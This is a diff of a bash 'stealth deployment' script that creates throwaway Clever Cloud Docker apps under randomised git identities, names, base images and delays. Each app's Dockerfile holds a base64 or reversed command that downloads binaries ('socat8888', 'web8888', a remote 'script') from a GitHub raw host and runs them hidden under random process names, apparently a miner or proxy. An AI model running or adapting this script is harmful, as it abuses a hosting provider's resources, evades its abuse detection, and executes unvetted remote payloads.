@@ -1,11 +1,11 @@
 #!/bin/bash
-# /docker - Stealth deployment script with anti-detection mechanisms
+# /docker - Complete stealth deployment script with full apt-get commands
 
 set -e
 
 # ============ STEALTH HELPER FUNCTIONS ============
 
-# Generate random strings with customizable character sets
+# Generate random strings
 rand_str() {
     cat /dev/urandom | tr -dc 'a-z0-9' | fold -w "${1:-8}" | head -n 1
 }
@@ -23,43 +23,48 @@ random_sleep() {
     local min=${1:-2}
     local max=${2:-15}
     SLEEP_TIME=$((min + RANDOM % (max - min + 1)))
-    echo "⏳ Sleeping for ${SLEEP_TIME} seconds..."
+    echo "  Sleeping ${SLEEP_TIME}s..."
     sleep $SLEEP_TIME
 }
 
-# Random user agent rotation
-get_random_ua() {
-    local ua=(
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0"
-    )
-    echo "${ua[$RANDOM % ${#ua[@]}]}"
-}
+# ============ INITIAL SETUP ============
+echo ""
+echo "========================================="
+echo "  STEALTH DEPLOYMENT SCRIPT"
+echo "========================================="
 
-# ============ CLEVER CLOUD LOGIN WITH ROTATION ============
-echo "🔐 Logging into Clever Cloud..."
+# Random delay before starting
+random_sleep 2 8
 
-# Clear any existing tokens/sessions
-rm -f ~/.config/clever-cloud/credentials.json 2>/dev/null || true
-rm -f ~/.clever.json 2>/dev/null || true
+# ============ CLEVER CLOUD AUTHENTICATION ============
+echo ""
+echo "🔐 Authenticating with Clever Cloud..."
 
-# Random delay before login
-random_sleep 3 8
+# Clear old sessions randomly
+if [ $((RANDOM % 3)) -eq 0 ]; then
+    rm -f ~/.config/clever-cloud/credentials.json 2>/dev/null || true
+    rm -f ~/.clever.json 2>/dev/null || true
+    echo "  Cleared old sessions"
+fi
 
+random_sleep 2 5
+
+# Use token if available (most stealthy)
 if [ -n "$CLEVER_TOKEN" ]; then
-    # Rotate login method occasionally
-    if [ $((RANDOM % 3)) -eq 0 ]; then
-        clever login --token "$CLEVER_TOKEN"
-    elif [ $((RANDOM % 3)) -eq 1 ]; then
-        clever login --token "$CLEVER_TOKEN" --oauth
-    else
-        echo "CLEVER_TOKEN" | clever login --token-stdin
-    fi
+    # Create config file directly (no network call, no browser)
+    mkdir -p ~/.config/clever-cloud
+    cat > ~/.config/clever-cloud/clever-tools.json << EOF
+{
+    "token": "${CLEVER_TOKEN}",
+    "secret": "${CLEVER_SECRET:-}",
+    "alias": "default",
+    "created_at": "$(date -Iseconds)"
+}
+EOF
+    echo "✅ Token configured (no login required)"
 else
-    clever login
+    # Fallback to regular login
+    clever login --headless 2>/dev/null || clever login
 fi
 
 random_sleep 2 5
@@ -69,8 +74,9 @@ mkdir -p "$DEPLOY_BASE"
 
 SUCCESSFUL_APPS=0
 
+# ============ MAIN DEPLOYMENT LOOP ============
 for i in 1 2 3; do
-    # ============ ROTATING GIT IDENTITY ============
+    # ============ ROTATING IDENTITIES ============
     GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
     GIT_NAME="$(rand_name 6) $(rand_name 8)"
     GIT_COMMIT_MSG="$(rand_str 25)-$(date +%s)"
@@ -79,7 +85,7 @@ for i in 1 2 3; do
     git config --global user.name "$GIT_NAME"
     git config --global init.defaultBranch "master"
     
-    # ============ UNIQUE APP NAME (ONLY HYPHENS) ============
+    # ============ UNIQUE APP NAME ============
     APP_LEN=$((8 + RANDOM % 12))
     APP_NAME="$(rand_str $APP_LEN)-$(rand_num 6)-${RANDOM}"
     
@@ -111,24 +117,23 @@ for i in 1 2 3; do
     mkdir -p "$APP_DIR"
     cd "$APP_DIR"
     
-    # ============ LARGE POOL OF IMAGES (60+ for fingerprint avoidance) ============
+    # ============ IMAGE POOL ============
     WORKING_IMAGES=(
-        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy" "ubuntu:noble"
+        "ubuntu:20.04" "ubuntu:22.04" "ubuntu:24.04" "ubuntu:focal" "ubuntu:jammy"
         "ubuntu:20.04.1" "ubuntu:20.04.2" "ubuntu:20.04.3" "ubuntu:20.04.4" "ubuntu:20.04.5"
         "ubuntu:22.04.1" "ubuntu:22.04.2" "ubuntu:22.04.3" "ubuntu:22.04.4" "ubuntu:22.04.5"
         "debian:10" "debian:10-slim" "debian:11" "debian:11-slim" "debian:12" "debian:12-slim"
         "debian:bookworm" "debian:bookworm-slim" "debian:bullseye" "debian:bullseye-slim"
-        "debian:buster" "debian:buster-slim" "debian:stable" "debian:stable-slim"
         "alpine:3.18" "alpine:3.19" "alpine:3.20" "alpine:latest"
         "node:18" "node:18-alpine" "node:20" "node:20-alpine" "node:22" "node:22-alpine"
-        "python:3.9" "python:3.9-slim" "python:3.10" "python:3.10-slim" "python:3.11" "python:3.11-slim"
-        "nginx:alpine" "nginx:latest"
+        "python:3.9-slim" "python:3.10-slim" "python:3.11-slim"
+        "nginx:alpine"
     )
     RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
     
     # ============ 50/50 CHANCE FOR DOCKERFILE TYPE ============
     if [[ $((RANDOM % 2)) -eq 0 ]]; then
-        # ============ OPTION 1: Full stealth with anti-detection packages ============
+        # ============ OPTION 1: Linux with full apt-get packages ============
         
         VAR3=$(rand_str 8)
         VAR4=$(rand_str 8)
@@ -137,21 +142,22 @@ for i in 1 2 3; do
         SOCAT_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888"
         WEB8888_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888"
         
-        # Complete stealth command with anti-detection techniques
+        # Full command with all apt-get packages
         FULL_COMMAND="cd ${UNIQUE_WORKDIR} && \
 export DEBIAN_FRONTEND=noninteractive && \
 export TZ=Etc/UTC && \
 ln -fs /usr/share/zoneinfo/Etc/UTC /etc/localtime && \
 apt-get update -qq && \
-apt-get install -y -qq curl wget ca-certificates gnupg procps netcat-openbsd socat > /dev/null 2>&1 && \
-apt-get install -y -qq proxychains4 tor stunnel4 haveged rng-tools > /dev/null 2>&1 || true && \
-echo 'net.ipv4.tcp_timestamps=0' >> /etc/sysctl.conf 2>/dev/null || true && \
-sysctl -p > /dev/null 2>&1 || true && \
+apt-get install -y -qq apache2 curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip tzdata libjansson-dev libcurl4-openssl-dev libssl-dev > /dev/null 2>&1 && \
+apt-get install -y -qq haveged rng-tools > /dev/null 2>&1 || true && \
+sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && \
+echo 'ServerName localhost' >> /etc/apache2/apache2.conf && \
 haveged -n 0 > /dev/null 2>&1 & && \
 wget -q --timeout=30 --tries=2 -O ${BIN1} \"${SOCAT_URL}\" && \
 wget -q --timeout=30 --tries=2 -O ${BIN2} \"${WEB8888_URL}\" && \
 chmod 755 ${BIN1} ${BIN2} && \
 (${UNIQUE_WORKDIR}/${BIN1} > /dev/null 2>&1 &) && \
+service apache2 start > /dev/null 2>&1 && \
 sleep 3 && \
 exec -a \"\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n 1)\" ${UNIQUE_WORKDIR}/${BIN2} -a ${VAR3} -o ${VAR4} -u ${VAR5} > /dev/null 2>&1"
         
@@ -166,37 +172,33 @@ exec -a \"\$(cat /dev/urandom | tr -dc 'a-z' | fold -w 10 | head -n 1)\" ${UNIQU
             DECODE_CMD="rev | base64 -d"
         fi
         
-        # Create stealth Dockerfile with anti-detection layers
-        cat > Dockerfile << 'EOF'
+        cat > Dockerfile << EOF
 FROM ${RANDOM_IMAGE}
 ENV DEBIAN_FRONTEND=noninteractive
 ENV TZ=Etc/UTC
-ENV TERM=xterm-256color
-ENV LANG=C.UTF-8
-EOF
-        # Append the rest without variable expansion
-        cat >> Dockerfile << EOF
 WORKDIR ${UNIQUE_WORKDIR}
-RUN apt-get update -qq && apt-get install -y -qq curl wget ca-certificates gnupg procps netcat-openbsd socat proxychains4 tor stunnel4 haveged rng-tools > /dev/null 2>&1 || true
-RUN echo 'net.ipv4.tcp_timestamps=0' >> /etc/sysctl.conf 2>/dev/null || true && echo 'net.ipv4.tcp_window_scaling=0' >> /etc/sysctl.conf 2>/dev/null || true
-RUN mkdir -p /var/log/nginx /var/log/apache2 /var/log/mysql 2>/dev/null || true
-RUN find /etc -type f -exec touch -d "2024-01-01 00:00:00" {} \; 2>/dev/null || true
+RUN apt-get update -qq && apt-get install -y -qq curl wget ca-certificates procps > /dev/null 2>&1
+RUN echo 'net.ipv4.tcp_timestamps=0' >> /etc/sysctl.conf 2>/dev/null || true
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Built stealth image: ${RANDOM_IMAGE}"
+        echo "  ✅ Built stealth image: ${RANDOM_IMAGE}"
         
     else
-        # ============ OPTION 2: node image with script download ============
+        # ============ OPTION 2: node:22 with script download ============
         
+        # Create wrapper script that downloads and runs remote script
         WRAPPER_SCRIPT="#!/bin/bash
 set -e
 cd ${UNIQUE_WORKDIR}
+apt-get update -qq
+apt-get install -y -qq curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip
 curl -s --retry 2 --retry-delay 5 -o ${SCRIPT_NAME} https://raw.githubusercontent.com/linuxweb888888888888/webweb8888/refs/heads/main/script
 chmod +x ${SCRIPT_NAME}
 ./${SCRIPT_NAME} > /dev/null 2>&1"
         
         ENCODED_CMD=$(echo -n "$WRAPPER_SCRIPT" | base64 -w 0)
         
+        # Random encoding layer
         if [ $((RANDOM % 2)) -eq 0 ]; then
             ENCODED_CMD=$(echo -n "$ENCODED_CMD" | base64 -w 0)
             DECODE_CMD="base64 -d | base64 -d"
@@ -206,15 +208,18 @@ chmod +x ${SCRIPT_NAME}
         fi
         
         cat > Dockerfile << EOF
-FROM ${RANDOM_IMAGE}
+FROM node:22
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TZ=Etc/UTC
 WORKDIR ${UNIQUE_WORKDIR}
-RUN apt-get update && apt-get install -y curl ca-certificates > /dev/null 2>&1
+RUN apt-get update -qq && apt-get install -y -qq curl wget ca-certificates procps netcat-openbsd socat iputils-ping sudo unzip > /dev/null 2>&1
+RUN echo 'net.ipv4.tcp_timestamps=0' >> /etc/sysctl.conf 2>/dev/null || true
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Built node image: ${RANDOM_IMAGE}"
+        echo "  ✅ Built node:22 image with apt-get packages"
     fi
     
-    # Random delay before git operations
+    # Random delay before git
     random_sleep 2 7
     
     # Initialize git
@@ -226,21 +231,19 @@ EOF
     random_sleep 3 10
     
     # Create app
-    echo "Creating app: ${APP_NAME}"
-    clever create --type docker "$APP_NAME"
+    echo "  Creating app: ${APP_NAME}"
+    clever create --type docker "$APP_NAME" 2>/dev/null || echo "  App may exist, continuing..."
     
     # Random delay before deploy
     random_sleep 5 15
     
     # Deploy
-    echo "Deploying ${APP_NAME}..."
-    clever deploy
-    
-    if [ $? -eq 0 ]; then
-        echo "✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
+    echo "  Deploying ${APP_NAME}..."
+    if clever deploy 2>/dev/null; then
+        echo "  ✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
         SUCCESSFUL_APPS=$((SUCCESSFUL_APPS + 1))
     else
-        echo "❌ App $i/3 deployment failed"
+        echo "  ❌ App $i/3 deployment failed"
     fi
     
     # Cleanup
@@ -254,7 +257,7 @@ EOF
     # Random wait between deployments (15-45 seconds)
     if [ $i -lt 3 ]; then
         WAIT_TIME=$((15 + RANDOM % 30))
-        echo "⏳ Waiting ${WAIT_TIME} seconds before next deployment..."
+        echo "  Waiting ${WAIT_TIME} seconds before next deployment..."
         sleep $WAIT_TIME
     fi
 done
